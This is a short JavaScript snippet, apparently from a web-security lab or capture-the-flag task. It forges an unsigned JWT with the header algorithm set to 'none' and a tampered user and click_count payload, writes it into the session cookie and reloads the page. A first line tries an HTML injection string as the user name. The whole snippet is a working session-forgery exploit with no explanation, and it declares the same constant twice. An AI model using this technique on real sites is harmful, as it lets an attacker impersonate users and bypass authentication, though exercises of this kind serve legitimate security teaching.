const p = {"user":"<b>TEST</b>","click_count":1337}; 
 
const h = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0"; const p = {"user":"z5426463","click_count":1337}; const b64 = btoa(JSON.stringify(p)).replace(/=+$/g, ""); document.cookie = `session=${h}.${b64}.; path=/`; location.reload();
